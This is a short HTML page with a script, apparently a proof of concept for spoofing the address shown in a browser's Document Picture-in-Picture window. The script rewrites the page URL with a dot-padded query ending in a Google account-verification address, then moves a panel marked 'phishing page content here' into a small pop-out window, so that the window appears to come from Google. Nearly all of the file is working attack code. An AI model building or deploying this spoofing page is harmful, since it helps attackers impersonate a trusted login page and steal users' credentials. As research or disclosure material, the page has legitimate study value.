<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>PIP Window Test</title>
<style>
    #content {
        display: none;
    }
    .pip-panel {
        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
        padding: 16px;
        color: #111827;
        background: #ffffff;
        min-height: 100%;
    }
    .pip-status {
        margin-top: 12px;
        font-size: 12px;
        color: #4b5563;
    }
</style>
</head>
<body>

<button id="button">Open PIP</button>
<div id="diag-status" class="pip-status"></div>

<div id="content" class="pip-panel">
    phishing page content here
</div>

<script>
(function () {
    'use strict';

    const buttonEl = document.getElementById('button');
    const contentEl = document.getElementById('content');
    const diagEl = document.getElementById('diag-status');

    const PIP_CONFIG = {
        width: 330,
        height: 317,
        spoofQuery: '?...............................https://accounts.google.com/login/device/verify',
        resetDelayMs: 1000
    };

    let activePipWindow = null;
    let resetQueryTimer = null;

    function logDiag(msg) {
        if (diagEl) diagEl.textContent = msg;
        console.log('[PiP]', msg);
    }

    function syncStylesToPip(pipWin) {
        if (!pipWin || !pipWin.document) return;
        const styleNodes = document.querySelectorAll('style, link[rel="stylesheet"]');
        styleNodes.forEach((node) => {
            try {
                pipWin.document.head.appendChild(node.cloneNode(true));
            } catch (_) {}
        });
    }

    function restoreContentToHost() {
        if (!contentEl) return;
        if (contentEl.parentElement !== document.body) {
            document.body.appendChild(contentEl);
        }
        contentEl.style.display = 'none';
    }

    const pipOpen = async () => {
        if (resetQueryTimer) {
            clearTimeout(resetQueryTimer);
            resetQueryTimer = null;
        }

        try {
            history.replaceState(null, '', PIP_CONFIG.spoofQuery);
        } catch (err) {
            logDiag('replaceState skipped: ' + err.message);
        }

        if (!('documentPictureInPicture' in window) || typeof window.documentPictureInPicture.requestWindow !== 'function') {
            logDiag('documentPictureInPicture not supported in this browser/WebView');
            if (contentEl) {
                contentEl.style.display = 'block';
            }
            return;
        }

        try {
            if (activePipWindow && !activePipWindow.closed) {
                activePipWindow.close();
            }

            const pipWindow = await window.documentPictureInPicture.requestWindow({
                width: PIP_CONFIG.width,
                height: PIP_CONFIG.height
            });

            activePipWindow = pipWindow;
            syncStylesToPip(pipWindow);

            if (contentEl) {
                contentEl.style.display = 'block';
                pipWindow.document.body.append(contentEl);
            }

            pipWindow.addEventListener('pagehide', () => {
                restoreContentToHost();
                activePipWindow = null;
                logDiag('PiP window closed');
            }, { once: true });

            resetQueryTimer = setTimeout(() => {
                try {
                    history.replaceState(null, '', '/');
                } catch (_) {}
            }, PIP_CONFIG.resetDelayMs);

            logDiag('PiP window active (' + PIP_CONFIG.width + 'x' + PIP_CONFIG.height + ')');
        } catch (err) {
            logDiag('requestWindow error (' + err.name + '): ' + err.message);
            restoreContentToHost();
        }
    };

    if (buttonEl) {
        buttonEl.onclick = pipOpen;
    }

    window.addEventListener('pagehide', () => {
        if (resetQueryTimer) clearTimeout(resetQueryTimer);
        restoreContentToHost();
    });
})();
</script>

</body>
</html>
